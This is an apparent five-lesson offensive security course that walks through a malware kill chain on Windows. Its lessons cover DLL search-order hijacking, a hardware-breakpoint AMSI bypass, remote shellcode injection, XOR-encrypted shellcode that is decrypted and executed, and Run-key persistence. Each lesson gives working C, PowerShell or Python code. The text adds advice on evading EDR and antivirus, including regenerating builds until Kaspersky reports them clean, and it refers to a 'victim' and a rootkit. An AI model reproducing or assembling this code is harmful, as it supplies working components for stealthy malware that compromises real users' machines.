LESSON 01 / 05

DLL SEARCH ORDER HIJACKING

Windows loads DLLs by searching a list of paths in order. If a path is writable and a DLL doesn't exist there, you can plant a malicious DLL that Windows loads before the real one.

// THE SEARCH ORDER

When an exe loads a DLL, Windows checks these paths in order: (1) the exe's own directory, (2) System32, (3) System, (4) Windows, (5) current working directory, (6) PATH directories.

If an exe in C:\Program Files\App\ tries to load version.dll and that directory is writable — you plant your DLL there named version.dll. App loads yours. Game over.

The recon script scans PATH directories for write access, then cross-references which DLLs running processes are trying (and failing) to load from those paths.

MISSION: Write the PowerShell DLL hijack scanner

// TARGET CODE:
$paths = $env:PATH -split ';'
foreach ($p in $paths) {
    if (-not (Test-Path $p)) { continue }
    $acl = Get-Acl $p -ErrorAction SilentlyContinue
    if (-not $acl) { continue }
    $writable = $acl.Access | Where-Object {
        $_.IdentityReference -match 'Users|Everyone' -and
        $_.FileSystemRights -match 'Write|FullControl'
    }
    if ($writable) {
        Write-Output "[WRITABLE] $p"
    }
}

// WHAT JUST HAPPENED

$env:PATH -split ';' — split the PATH variable into individual directories.

Get-Acl retrieves the access control list for a path — who has what permissions. -ErrorAction SilentlyContinue skips permission-denied errors silently.

Filtering for Users|Everyone catches the common case where non-admin users have write access — which is the misconfiguration that enables DLL hijacking.

The real winrecon.ps1 goes further: it uses Procmon-style API hooks to find DLLs that running processes are loading from writable PATH dirs. That's the full hunt.

LESSON 02 / 05

AMSI BYPASS — HARDWARE BREAKPOINTS

Hardware breakpoints intercept function execution at the CPU level — before any code runs. Set one on AmsiScanBuffer, redirect execution to return "clean" without modifying the function's memory.

// WHY HWBP BEATS PATCHING

The classic AMSI bypass patches AmsiScanBuffer in memory — changes the first bytes to return AMSI_RESULT_CLEAN. Problem: EDRs monitor memory writes. They see the patch and alert.

Hardware breakpoints use CPU debug registers (DR0-DR7). No memory modification. No write to monitored regions. EDR sees nothing. The breakpoint fires when AmsiScanBuffer executes, your exception handler runs, you change the return value, execution continues as if AMSI said "clean".

This technique was the core of VADER's AMSI bypass. It's documented in the MSRC disclosure (VULN-195458) and in asf-counterintel repo.

MISSION: Write the HWBP setup function in C

// TARGET CODE — set hardware breakpoint on a function:
void set_hwbp(HANDLE thread, void *target) {
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(thread, &ctx);
    ctx.Dr0 = (DWORD64)target;
    ctx.Dr7 = (ctx.Dr7 & ~0xF) | 0x1;
    SetThreadContext(thread, &ctx);
}

LONG WINAPI amsi_handler(EXCEPTION_POINTERS *ep) {
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        ep->ContextRecord->Rax = 0;
        ep->ContextRecord->Rip += 1;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
// YOUR CODE:

// WHAT JUST HAPPENED

CONTEXT_DEBUG_REGISTERS — tells GetThreadContext to populate the debug register fields (DR0-DR7). DR0 holds the breakpoint address. DR7 is the control register — bit 0 enables DR0 as a local execution breakpoint.

ctx.Dr7 = (ctx.Dr7 & ~0xF) | 0x1 — clear the bottom 4 bits, set bit 0 (enable DR0, local). The other bits control breakpoint type (read/write/execute) and condition width. 0x1 = execute.

When execution hits the breakpoint, Windows fires EXCEPTION_SINGLE_STEP. Our VEH handler catches it. Rax = 0 sets the return value to AMSI_RESULT_CLEAN. Rip += 1 skips one instruction so we don't loop. EXCEPTION_CONTINUE_EXECUTION resumes.

Zero memory writes. Zero signature. The CPU registers the hook, not the memory scanner.

LESSON 03 / 05

PROCESS INJECTION — CLASSIC TRIAD

Write shellcode into a target process's memory space, then create a thread there to execute it. Three API calls: VirtualAllocEx, WriteProcessMemory, CreateRemoteThread.

// THE THREE API CALLS

VirtualAllocEx — allocate memory in the target process. Request RWX (read/write/execute) permissions. Returns the address of the new allocation in the target's address space.

WriteProcessMemory — write your shellcode bytes into that allocated region. You're writing into another process's memory from outside it.

CreateRemoteThread — create a new thread in the target process, starting at the address you just wrote to. The thread executes your shellcode in the context of the target process.

MISSION: Write inject_shellcode() in C

// TARGET CODE:
BOOL inject_shellcode(DWORD pid, BYTE *shellcode, SIZE_T sc_len) {
    HANDLE proc = OpenProcess(
        PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD,
        FALSE, pid
    );
    if (!proc) return FALSE;
    LPVOID mem = VirtualAllocEx(proc, NULL, sc_len,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) { CloseHandle(proc); return FALSE; }
    SIZE_T written = 0;
    WriteProcessMemory(proc, mem, shellcode, sc_len, &written);
    HANDLE thread = CreateRemoteThread(
        proc, NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL
    );
    WaitForSingleObject(thread, 5000);
    CloseHandle(thread);
    CloseHandle(proc);
    return TRUE;
}
// YOUR CODE:

// WHAT JUST HAPPENED

PROCESS_VM_WRITE | PROCESS_VM_OPERATION — required to write memory. PROCESS_CREATE_THREAD — required to create a remote thread. OpenProcess fails if the target runs at higher integrity or the call lacks SeDebugPrivilege.

PAGE_EXECUTE_READWRITE — RWX memory. Write to it then execute from it. Modern EDRs flag RWX allocations — a stealth improvement is to allocate RW, write, then change to RX with VirtualProtectEx before executing.

WaitForSingleObject(thread, 5000) — waits 5 seconds for the injected thread to exit. Without this, the injector exits and the injected shellcode may be killed before it finishes.

The vader_inject.c and vader_inject_annotated.obj in CHEYANNE implement this with additional improvements: PPID spoof, RW-then-RX, and shellcode XOR decryption in the target process.

LESSON 04 / 05

XOR OBFUSCATION — ENCRYPT ON DISK

XOR-encrypt the shellcode before it goes into the PE. The binary on disk contains ciphertext. AV scans ciphertext — no signature match. At runtime, XOR-decrypt in memory and execute.

// WHY XOR

XOR encryption is symmetric — XOR with key to encrypt, XOR with same key to decrypt. One operation serves both directions. Simple. Fast. Zero dependencies.

AV signatures look for known shellcode byte sequences. If the shellcode is XOR'd with a random key, the on-disk bytes match nothing. The key is compiled into the binary — reversible, but that's enough to defeat static analysis.

CHEYANNE's ghost_fud.exe uses this with a random seed per build. The FUD loop (metamorph.py) generates different seeds until Kaspersky returns clean. Seed 66728 = CLEAN.

MISSION: Write the XOR encrypt/decrypt function in C

// TARGET CODE:
void xor_crypt(BYTE *buf, SIZE_T len, BYTE key) {
    for (SIZE_T i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}

void decrypt_and_run(BYTE *encrypted, SIZE_T len, BYTE key) {
    BYTE *buf = (BYTE *)VirtualAlloc(NULL, len,
        MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(buf, encrypted, len);
    xor_crypt(buf, len, key);
    ((void(*)())buf)();
}
// YOUR CODE:

// WHAT JUST HAPPENED

buf[i] ^= key — XOR every byte with the key. To encrypt: call on plaintext. To decrypt: call again on ciphertext with same key. XOR is its own inverse.

((void(*)())buf)() — cast the buffer pointer to a function pointer and call it. This is how shellcode executes from a buffer: the bytes ARE machine code, calling them as a function executes them.

The stealth improvement in vader_clean_annotated.obj: allocate as RW, XOR decrypt, then VirtualProtect to RX before calling. This avoids creating RWX memory — a high-signal EDR indicator. Two-step allocation is much quieter.

LESSON 05 / 05

REGISTRY PERSISTENCE

Write to HKCU\Software\Microsoft\Windows\CurrentVersion\Run to execute a payload on every login. No admin required. Survives reboots. This is what the TCP shell's persist command does automatically.

// THE RUN KEY

Windows reads HKCU\...\Run on every logon and executes every value in it. No UAC prompt because HKCU is user-writable. No admin because it's your own user hive.

The test_local_chain.py validates this: after the TCP shell establishes, it sends the persist command, then reads the Run key back to verify the entry was written.

Detection: defenders check this key. To be stealthier, use: scheduled tasks (schtasks), WMI subscriptions, or COM object hijacking. The Run key is the most obvious but simplest.

MISSION: Write the Python persistence installer

// TARGET CODE:
import winreg

def install_run_key(name, exe_path):
    key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0, winreg.KEY_SET_VALUE
    )
    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, exe_path)
    winreg.CloseKey(key)
    return True

def verify_run_key(name):
    key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0, winreg.KEY_READ
    )
    val, _ = winreg.QueryValueEx(key, name)
    winreg.CloseKey(key)
    return val

winreg.KEY_SET_VALUE — the permission needed to write values. KEY_READ for reading. Requesting more permissions than needed increases the chance of triggering audit logs.

winreg.REG_SZ — registry string type. The value is a path to an executable (or a quoted path with arguments).

In the CHEYANNE kill chain, the persist command runs this through the TCP shell on the victim. The test_local_chain.py runs persist on localhost and reads the key back to confirm — that's the 8th check in the 8/8 PASS sequence.

VADER rootkit combined all five techniques: DLL hijacking for delivery, HWBP for AMSI evasion, process injection for payload execution, XOR for on-disk obfuscation, and Run key for persistence. Submitted to MSRC as VULN-195458.
